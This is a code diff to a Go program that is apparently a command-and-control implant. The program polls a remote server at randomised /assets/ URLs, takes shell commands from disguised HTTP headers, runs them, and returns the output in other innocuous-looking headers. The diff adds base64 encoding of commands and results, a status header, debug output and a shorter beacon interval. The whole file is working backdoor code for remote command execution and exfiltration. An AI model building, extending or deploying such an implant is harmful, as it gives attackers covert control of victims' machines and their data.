@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
 	"fmt"
 	"math/rand"
 	"net/http"
@@ -45,10 +46,24 @@ func executeCommand(command string) (string, error) {
 	return out.String(), nil
 }
 
+func decrypt(data string) string {
+	decoded, err := base64.StdEncoding.DecodeString(data)
+	if err != nil {
+		return ""
+	}
+	return string(decoded)
+}
+
+func encrypt(data string) string {
+	encoded := base64.StdEncoding.EncodeToString([]byte(data))
+	return encoded
+}
+
 const (
-	ID_HEADER          = "Context-Verification"
 	FINGERPRINT_HEADER = "Transfer-Context"
 	COMMAND_HEADER     = "Cache-Cache-Protocol"
+	ID_HEADER          = "Context-Verification"
+	STATUS_HEADER      = "X-DNS-Record"
 	RESULT_HEADER      = "X-Resource-Priority"
 )
 
@@ -61,16 +76,18 @@ func main() {
 
 	for {
 		// Random sleep time between 1 and 5 minutes
-		sleepTime := time.Duration(rand.Intn(4*60)+60) * time.Second
+		// sleepTime := time.Duration(rand.Intn(4*60)+60) * time.Second
+		sleepTime := time.Second * 5
 		time.Sleep(sleepTime)
 
 		// Generate a random filename
 		filename := generateRandomFilename()
-		url := fmt.Sprintf("http://%s:%s/static/%s", ip, port, filename)
+		url := fmt.Sprintf("http://%s:%s/assets/%s", ip, port, filename)
 
 		// Create HTTP request
 		req, err := http.NewRequest("GET", url, nil)
 		if err != nil {
+			fmt.Println("Error creating HTTP request:", err)
 			continue
 		}
 
@@ -80,40 +97,60 @@ func main() {
 		client := &http.Client{}
 		resp, err := client.Do(req)
 		if err != nil {
+			fmt.Println("Error making HTTP request:", err)
 			continue
 		}
 
 		// Check for command
-		command := resp.Header.Get(COMMAND_HEADER)
+		command := decrypt(resp.Header.Get(COMMAND_HEADER))
 		if command == "" {
+			fmt.Println("No command received in response header")
 			continue
 		}
+
+		fmt.Println("Received command:", command)
 
 		id := resp.Header.Get(ID_HEADER)
 		if id == "" {
+			fmt.Println("No ID received in response header")
 			continue
 		}
-		
-		// Execute the decoded bash command
-		cmdOutput, err := executeCommand(command)
-		if err != nil {
-			continue
-		}
-		
-		// Set up the follow-up request
-		followupReq, err := http.NewRequest("GET", url, nil)
-		if err != nil {
-			continue
-		}
-
-		followupReq.Header.Set(RESULT_HEADER, cmdOutput)
-		followupReq.Header.Set(ID_HEADER, id)
-		followupReq.Header.Set(FINGERPRINT_HEADER, fingerprint)
-		
-		// Send the follow-up request
-		client.Do(followupReq)
+		fmt.Println("Received ID:", id)
 
 		resp.Body.Close()
 
+		// Execute the decoded bash command
+		cmdOutput, err := executeCommand(command)
+		status := ""
+		if err != nil {
+			status = "error"
+			cmdOutput = err.Error()
+		} else {
+			status = "success"
+		}
+
+		// Set up the follow-up request
+		filename = generateRandomFilename()
+		url = fmt.Sprintf("http://%s:%s/assets/%s", ip, port, filename)
+		followupReq, err := http.NewRequest("GET", url, nil)
+		if err != nil {
+			fmt.Println("Error creating follow-up request:", err)
+			continue
+		}
+
+		followupReq.Header.Set(RESULT_HEADER, encrypt(cmdOutput))
+		followupReq.Header.Set(STATUS_HEADER, encrypt(status))
+		followupReq.Header.Set(ID_HEADER, id)
+		followupReq.Header.Set(FINGERPRINT_HEADER, fingerprint)
+
+		// Send the follow-up request
+		_, err = client.Do(followupReq)
+		if err != nil {
+			fmt.Println("Error sending follow-up request:", err)
+			continue
+		}
+
+		time.Sleep(time.Second * 5)
+		break
 	}
 }
